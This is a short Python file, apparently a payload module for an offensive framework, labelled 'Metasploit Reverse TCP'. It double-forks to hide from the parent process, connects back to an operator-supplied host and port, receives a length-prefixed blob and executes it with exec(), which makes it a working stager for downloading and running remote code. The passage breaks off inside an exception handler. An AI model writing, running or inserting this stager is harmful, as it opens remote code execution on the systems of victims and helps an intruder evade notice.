'''
NAME: Metasploit Reverse TCP
DESCRIPTION: Connects back to a server in a generic way for metasploit handlers
VAR LHOST: Metasploit host ip
VAR LPORT: Metasploit host port
'''

import os

try:
    # Use double fork + setsid/umask to mask parent process etc...
    if os.fork() == 0:
        if os.fork():
            # _exit exits without cleanup.
            os._exit(0)

        import socket,struct
        s=socket.socket(2,1)
        s.connect((LHOST,int(LPORT)))
        l=struct.unpack('>I',s.recv(4))[0]
        d=s.recv(4096)
        while len(d)!=l:
            d+=s.recv(4096)
        exec(d,{'s':s})
except OSError as e:
